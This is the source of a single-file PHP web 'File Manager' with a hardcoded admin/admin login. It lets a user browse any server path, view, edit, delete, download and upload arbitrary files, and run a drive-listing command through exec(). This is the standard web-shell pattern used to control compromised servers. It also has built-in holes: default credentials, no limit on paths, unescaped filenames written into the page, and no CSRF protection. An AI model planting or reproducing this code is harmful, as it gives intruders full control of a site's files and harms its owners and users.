<?php
//
// Configuration and Session Setup
//
error_reporting(0); // Disable error reporting for production
session_start(); // Start the session
define('username', 'admin'); // Define the username
define('password', 'admin'); // Define the password

//
// Helper Functions
//

// Check if a variable is set
function has($obj) {
    return isset($obj);
}

// Output and terminate execution
function dd($text) {
    die($text);
}

// Get session value
function get_session($name) {
    return has($_SESSION[$name]) ? $_SESSION[$name] : false;
}

// Set session value
function set_session($name, $val) {
    $_SESSION[$name] = $val;
}

// Get POST data
function get_post($name) {
    return has($_POST[$name]) ? $_POST[$name] : false;
}

// Get GET data
function get_get($name) {
    return has($_GET[$name]) ? $_GET[$name] : false;
}

// Create an input element
function makeInput($type, $name, $val = "", $style = "") {
    if (in_array($type, ['text', 'password', 'submit', 'file'])) {
        return "<input type='$type' name='$name' value='$val' class='$style'/>";
    }
    return "<$type name='$name' class='$style'>$val</$type>";
}

// Create a form
function makeForm($method, $inputArray, $file = "") {
    $form = "<form method='$method' enctype='$file' class='mb-4 p-4 bg-gray-800 rounded-lg'>";
    foreach ($inputArray as $key => $val) {
        $form .= makeInput($key, (is_array($val) ? $val[0] : $val), (has($val[1]) ? $val[1] : ""), (has($val[2]) ? $val[2] : ""));
    }
    return $form . "</form>";
}

// Create a table
function makeTable($thead, $tbody) {
    $head = "";
    foreach ($thead as $th) {
        $head .= "<th class='px-4 py-2 bg-gray-700'>$th</th>";
    }
    $body = "";
    foreach ($tbody as $tr) {
        $body .= "<tr class='hover:bg-gray-700'>";
        foreach ($tr as $td) {
            $body .= "<td class='border px-4 py-2 border-gray-600'>$td</td>";
        }
        $body .= "</tr>";
    }
    return "<table class='w-full table-auto'><thead>$head</thead><tbody>$body</tbody></table>";
}

// Create a link
function makeLink($link, $text, $target = "") {
    return "<a href='$link' target='$target' class='text-blue-400 hover:text-blue-300'>$text</a> ";
}

// Handle login logic
function login() {
    if (get_session('login')) {
        return true;
    }
    if (!get_post('login')) {
        return false;
    }
    if (get_post('username') != username || get_post('pass') != password) {
        return false;
    }
    set_session('login', true);
    return true;
}

// Get the current directory path
function get_path() {
    $path = __dir__;
    if (get_get('path')) {
        $path = get_get('path');
    }
    return $path;
}

// Convert file size to a human-readable format
function filesize_convert($bytes) {
    $label = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');
    for ($i = 0; $bytes >= 1024 && $i < (count($label) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . " " . $label[$i]);
}

// Get file modification time
function fileTime($path) {
    return date("M d Y H:i:s", filemtime($path));
}

// Download a file
function download_file($download) {
    if (!is_file($download)) {
        return false;
    }
    header('Content-Type: application/octet-stream');
    header('Content-Transfer-Encoding: Binary');
    header('Content-disposition: attachment; filename="' . basename($download) . '"');
    return readfile($download);
}

// Delete a file or directory
function delete_file($delete) {
    if (is_file($delete)) {
        return unlink($delete);
    }
    if (is_dir($delete)) {
        return rmdir($delete);
    }
    return false;
}

// Edit a file
function edit_file($edit) {
    if (is_file($edit)) {
        return makeForm('POST',
            ['textarea' => ['edit', htmlentities(file_get_contents($edit)), "w-full h-64 p-2 border rounded bg-gray-700 text-white"],
                'submit' => ['save', 'Save', 'bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-700']]);
    }
    return false;
}

// Save edited file
function save_edit($path, $str) {
    if (is_file($path)) {
        file_put_contents($path, html_entity_decode($str));
        return true;
    }
    return false;
}

// View file content
function view_file($path) {
    if (is_file($path)) {
        return htmlentities(file_get_contents($path));
    }
    return false;
}

// Create a new file
function new_file($path, $name) {
    if (!is_file($path . '/' . $name)) {
        file_put_contents($path . '/' . $name, "");
        return true;
    }
    return false;
}

// Create a new directory
function new_dir($path, $name) {
    if (!is_dir($path . '/' . $name)) {
        mkdir($path . '/' . $name);
        return true;
    }
    return false;
}

// Upload a file
function upload_file($path, $file) {
    $name = basename($file['name']);
    if (!is_file($path . '/' . $name)) {
        if (move_uploaded_file($file["tmp_name"], $path . '/' . $name)) {
            return true;
        }
    }
    return false;
}

// Get the parent directory path
function get_back($path) {
    if ($path == "" || $path == "/") {
        return $path;
    }
    $path = explode("/", str_replace('\\', '/', $path));
    array_pop($path);
    return implode("/", $path);
}

// Get Windows disk drives
function win_disk() {
    exec("wmic logicaldisk get caption", $c);
    $ret = "";
    foreach ($c as $d)
        $ret .= ($d != "Caption" ? makeLink("?path=$d", $d) : "");
    return $ret;
}

// Get directory contents
function get_dir() {
    $path = get_path();
    if (!is_dir($path)) {
        return false;
    }
    $dir = scandir($path);
    $files = [];
    $i = 0;
    foreach ($dir as $d) {
        if ($d == '.' || $d == '..') {
            continue;
        }
        $p = $path . '/' . $d;
        $s = '--';
        $icon = "&#128193;"; // Folder icon
        $t = fileTime($p);
        $l = makeLink("?path=$p", $d);
        $perms = substr(sprintf("%o", fileperms($p)), -4);
        $owner = (function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($p))['name'] : fileowner($p));
        $controller =
            (is_file($p) ? makeLink("?edit=$p", "Edit", "_blank") : '') .
            makeLink("?delete=$p", "Delete", "_blank") .
            (is_file($p) ? makeLink("?download=$p", "Download", "_blank") : '');

        // Image preview on hover
        if (is_file($p) && in_array(strtolower(pathinfo($p, PATHINFO_EXTENSION)), ['jpg', 'jpeg', 'png', 'gif'])) {
            $l = "<div class='relative group'><span>$d</span><div class='hidden group-hover:block absolute z-10 bg-gray-800 p-2 rounded-lg'><img src='$p' class='w-32 h-32 object-cover'></div></div>";
        }

        if (is_file($p)) {
            $s = filesize_convert(filesize($p));
            $icon = "&#128221;"; // File icon
        }
        $files[] = [$icon, $i, $l, $s, $t, $perms, $owner, $controller];
        $i++;
    }
    return makeTable(['#', 'id', 'Filename', 'Size', 'Modified', 'Perms', 'Owner', ''], $files);
}

// Login Template
$loginTemplate = "
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Login</title>
    <script src='https://cdn.tailwindcss.com'></script>
</head>
<body class='bg-gray-900 flex items-center justify-center h-screen'>
    <div class='bg-gray-800 p-8 rounded-lg shadow-lg w-96'>
        <h1 class='text-2xl font-bold mb-6 text-center text-white'>Login</h1>
        <form method='POST' class='space-y-4'>
            <div>
                <label for='username' class='block text-sm font-medium text-gray-300'>Username</label>
                <input type='text' name='username' id='username' class='w-full p-2 border rounded bg-gray-700 text-white' required>
            </div>
            <div>
                <label for='password' class='block text-sm font-medium text-gray-300'>Password</label>
                <input type='password' name='pass' id='password' class='w-full p-2 border rounded bg-gray-700 text-white' required>
            </div>
            <button type='submit' name='login' class='w-full bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-700'>Login</button>
        </form>
    </div>
</body>
</html>";

// Check if user is logged in
if (!login()) {
    dd($loginTemplate);
}

// Handle file deletion
if (get_get("delete")) {
    delete_file(get_get("delete")) ? dd("Deleted: " . get_get("delete")) : dd("File not found");
}

// Handle file editing
if (get_get("edit")) {
    if (get_post('save')) {
        save_edit(get_get('edit'), get_post('edit'));
        echo "Saved";
    }
    $edit = edit_file(get_get("edit"));
    $edit ? dd($edit) : dd("File not found");
}

// Handle file download
if (get_get('download')) {
    @readfile(download_file(get_get('download')));
    exit();
}

// Handle new file creation
if (get_post('newfile')) {
    new_file(get_path(), get_post('filename')) ? dd('Create: ' . get_post('filename')) : dd('File exists');
}

// Handle new directory creation
if (get_post('newdir')) {
    new_dir(get_path(), get_post('dirname')) ? dd('Create: ' . get_post('dirname')) : dd('Dir exists');
}

// Handle file upload
if (get_post('upload')) {
    upload_file(get_path(), $_FILES['file']) ? dd('upload: ' . $_FILES['file']['name']) : dd('Upload Error');
}

// Main UI
echo "
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>File Manager</title>
    <script src='https://cdn.tailwindcss.com'></script>
</head>
<body class='p-8 bg-gray-900 text-white'>
    <div class='space-y-4'>
        " .
    makeForm('POST', ['text' => ['filename', 'File Name', 'w-full p-2 border rounded bg-gray-700 text-white'], 'submit' => ['newfile', 'Create', 'bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-700']]) .
    makeForm('POST', ['text' => ['dirname', 'Dir Name', 'w-full p-2 border rounded bg-gray-700 text-white'], 'submit' => ['newdir', 'Create', 'bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-700']]) .
    makeForm('POST', ['file' => 'file', 'submit' => ['upload', 'Upload', 'bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-700']], 'multipart/form-data') .
    makeLink("?path=" . get_back(get_path()), "[Back]") .
    (PHP_OS_FAMILY == "Windows" ? win_disk() : "") .
    (is_dir(get_path()) ? get_dir() : '<pre class="bg-gray-800 p-4 rounded shadow">' . view_file(get_path()) . '</pre>') .
    "
    </div>
</body>
</html>";
